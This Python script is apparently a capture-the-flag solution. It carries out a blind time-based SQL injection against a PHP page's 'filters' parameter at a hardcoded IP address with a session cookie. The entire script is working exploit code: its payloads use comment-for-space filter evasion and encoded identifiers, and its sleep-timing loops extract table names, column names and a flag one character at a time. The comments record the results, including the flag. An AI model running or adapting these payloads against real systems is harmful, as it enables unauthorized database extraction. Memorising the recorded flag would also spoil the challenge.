import requests as r

url = 'http://65.0.4.132/home.php'
cookie={'PHPSESSID': 'lqsed6jufmion3kl0uq2n3bh3h'}

#table length extraction => 17
print('Starting length extraction: \r\n')
for i in range(1, 20):
    #print(' currentlength ' + str(i))
    payload='1,(select/**/if(((select/**/length(group_concat(table_name))/**/from/**/information_schema.tables/**/where/**/table_schema=database())='+str(i)+'),NULL,sleep(1)))'
    res = r.post(url, cookies=cookie, data={'filters': payload})
    
    if(res.elapsed.total_seconds() < 4.00):
        tabllength = i
        print('Length of the tables concatenated:' + str(i))
        #print(res.text)
        print(res.elapsed.total_seconds())
        break

# tablename => accountsproducts
print('starting table name extraction: \r\n')
tablename = ''
for i in range(1, tabllength + 1):
    for j in range(97, 122):
        #print(str(i)+' ' + chr(j))
        payload='1,(select/**/if((substring((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),'+str(i)+',1)=unhex(hex('+str(j)+'))),NULL,sleep(1)));'
        res = r.post(url, cookies=cookie, data={'filters': payload})
        if(res.elapsed.total_seconds() < 4.00):
            tablename = tablename + chr(j)
            break
print(tablename)

# collength from table products => 23
print('starting column length extraction: \r\n')
for i in range(10, 25):
    #print('curr column length: ' + str(i))
    payload='1,(select/**/if(((select/**/length(group_concat(column_name))/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36)))))='+str(i)+'),NULL,sleep(1)));'
    res = r.post(url, cookies=cookie, data={'filters': payload})
    if(res.elapsed.total_seconds() < 4.00):
        collength = i
        print('Length of the columns concatenated: ' + str(i))
        #print(res.text)
        break

# colname from table products => idnamepriceexclusive
print('starting column names extraction: ')
colname = ''
for i in range(1, collength + 1):
    for j in range(97,122):
        #print(str(i)+' ' + chr(j))
        payload='1,(select/**/if(((substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36))))),'+str(i)+',1))=unhex(hex('+str(j)+'))),NULL,sleep(1)))'
        res = r.post(url, cookies=cookie, data={'filters': payload})
        if(res.elapsed.total_seconds() < 4.00):
            colname = colname + chr(j)
            break
print('concatenated column names: '+ colname)

# flaglength when exclusive = 1 => 35
print('Starting to extract flag length: ')
for i in range(30, 50):
    #print('curr flag length: ' + str(i))
    payload = '1,(select/**/if((length((select/**/name/**/from/**/products/**/where/**/exclusive=1))='+str(i)+'),NULL,sleep(1)));'
    res = r.post(url, cookies=cookie, data={'filters':payload})
    if(res.elapsed.total_seconds() < 4.00):
        flaglength = i
        print('Length of the flag: ' + str(i))
        #print(res.text)
        break

# flag => BSDCTF{1_see_u_dumped_the_database}
print('starting to extract flag: ')
flag = ''
for i in range(1, flaglength + 1) :
    for j in range(48, 126):
        #print(str(i) + ' ' + chr(j))
        payload='1,(select/**/if(((hex(substring((select/**/name/**/from/**/products/**/where/**/exclusive=1),'+str(i)+',1)))=hex('+str(j)+')),NULL,sleep(1)));'
        res = r.post(url, cookies=cookie, data={'filters': payload})
        if(res.elapsed.total_seconds() < 4.00):
            flag = flag + chr(j)
            #print(flag)
            break
print('Flag: '+ flag)
